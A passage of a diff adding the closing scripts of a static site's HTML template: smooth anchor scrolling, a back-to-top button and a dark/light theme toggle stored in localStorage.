+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
